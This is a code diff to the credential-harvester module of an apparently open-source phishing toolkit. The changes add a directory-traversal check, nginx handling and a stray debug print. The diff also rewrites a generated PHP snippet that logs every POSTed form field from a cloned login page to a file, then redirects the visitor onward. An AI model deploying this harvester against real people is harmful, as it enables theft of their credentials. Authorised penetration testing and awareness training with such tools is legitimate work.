@@ -28,9 +28,7 @@ import shutil
 # get path to normal
 definepath = os.getcwd()
 sys.path.append(definepath)
-
 from src.core.setcore import *
-
 sys.path.append("/etc/setoolkit")
 from set_config import APACHE_SERVER as apache_check
 from set_config import WEBATTACK_EMAIL as webattack_email
@@ -38,16 +36,10 @@ from set_config import TRACK_EMAIL_ADDRESSES as track_email
 from set_config import HARVESTER_LOG as logpath
 sys.path.append(definepath)
 
+
 if track_email == True:
-    print_status(
-        "You have selected to track user accounts, Apache will automatically be turned on to handle tracking of users.")
+    print_status("You have selected to track user accounts, Apache will automatically be turned on to handle tracking of users.")
     apache_check = True
-# detect openssl module
-try:
-    from OpenSSL import SSL
-# handle import error that openssl is not there
-except ImportError:
-    print("Python OpenSSL wasn't detected, note that SSL compatibility is now turned off")
 
 ############################################
 #          Credential harvester            #
@@ -60,8 +52,27 @@ me = mod_name()
 # append python to our current working directory
 sys.path.append(definepath)
 
+
+if not os.path.isfile("%s/src/logs/harvester.log" % (os.getcwd())):
+    filewrite = file("%s/src/logs/harvester.log" % (os.getcwd()), "w")
+    filewrite.write("")
+    filewrite.close()
+
+
 # import the base setcore libraries
 from src.core.setcore import *
+
+# detect openssl module
+try:
+#   from OpenSSL import SSL
+    from OpenSSL import SSL
+
+# handle import error that openssl is not there
+except Exception as err:
+#    print("Python OpenSSL wasn't detected or PEM file not found, note that SSL compatibility will be affected.")
+#    print_status("Printing error: " + str(err))
+    pass
+
 
 attack_vector = ""
 fileopen = open(setdir + "/attack_vector", "r")
@@ -236,8 +247,8 @@ class SETHandler(BaseHTTPRequestHandler):
             #print('-' * 40)
             pass
 
-        counter = 0
-
+        webroot = os.path.abspath(os.path.join(setdir, 'web_clone'))
+        requested_file = os.path.abspath(os.path.join(webroot, self.path))
         # try block setup to catch transmission errors
         try:
 
@@ -251,10 +262,9 @@ class SETHandler(BaseHTTPRequestHandler):
                 # write out that we had a visit
                 visits.write("hit\n")
                 # visits.close()
-                counter = 1
 
             # used for index2
-            if self.path == "/index2.html":
+            elif self.path == "/index2.html":
                 self.send_response(200)
                 self.send_header('Content_type', 'text/html')
                 self.end_headers()
@@ -264,25 +274,23 @@ class SETHandler(BaseHTTPRequestHandler):
                 # write out that we had a visit
                 visits.write("hit\n")
                 # visits.close()
-                counter = 1
 
             else:
-                if os.path.isfile(setdir + "/web_clone/%s" % (self.path)):
+                if not requested_file.startswith(webroot + os.path.sep):
+                    print('directory traversal attempt detected from: ' + self.client_address[0])
+                    self.send_response(404)
+                    self.end_headers()
+
+                elif os.path.isfile(requested_file):
                     self.send_response(200)
                     self.end_headers()
-                    fileopen = open(setdir + "/web_clone/%s" %
-                                    (self.path), "rb")
+                    fileopen = open(requested_file, "rb")
                     for line in fileopen:
                         self.wfile.write(line)
 
-            # if the file wasn't found
-            if counter == 0:
-                if os.path.isfile(setdir + "/web_clone/%s" % (self.path)):
-                    fileopen = open(setdir + "/web_clone/%s" %
-                                    (self.path), "rb")
-                    for line in fileopen:
-                        self.wfile.write(line)
-                    fileopen.close()
+                else:
+                    self.send_response(404)
+                    self.end_headers()
 
         # handle errors, log them and pass through
         except Exception as e:
@@ -409,19 +417,21 @@ def run():
 
         # handle the rest
         except Exception as e:
-            print(bcolors.RED + "[*] Looks like the web_server can't bind to 80. Are you running Apache?" + bcolors.ENDC)
-            apache_stop = input(
-                "Do you want to attempt to disable Apache? [y/n]: ")
+            print(bcolors.RED + "[*] Looks like the web_server can't bind to 80. Are you running Apache or NGINX?" + bcolors.ENDC)
+            apache_stop = input("Do you want to attempt to disable Apache? [y/n]: ")
             apache_counter = 0
             if apache_stop == "yes" or apache_stop == "y" or apache_stop == "":
                 if os.path.isfile("/etc/init.d/apache2"):
-                    subprocess.Popen(
-                        "/etc/init.d/apache2 stop", shell=True).wait()
+                    subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                     apache_counter = 1
                 if os.path.isfile("/etc/init.d/httpd"):
-                    subprocess.Popen("/etc/init.d/httpd stop",
-                                     shell=True).wait()
+                    subprocess.Popen("/etc/init.d/httpd stop", shell=True).wait()
                     apache_counter = 1
+
+                if os.path.isfile("/etc/init.d/nginx"):
+                    subprocess.Popen("/etc/init.d/nginx stop", shell=True).wait()
+                    apache_counter = 1 
+
             if apache_counter == 1:
 
                 # check if we are running apache mode
@@ -498,7 +508,7 @@ def run():
         now = str(datetime.datetime.today())
         harvester_file = ("harvester_" + now + ".txt")
         filewrite.write(
-            """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />\n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */""" % (harvester_file, RAW_URL))
+            """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
         filewrite.close()
         if os.path.isdir("/var/www/html"):
             logpath = ("/var/www/html")
@@ -649,6 +659,7 @@ try:
 
     # if we are using ssl
     if ssl_flag == 'true':
+        print "GOAT"
         ssl_server()
 
     # if we aren't using ssl
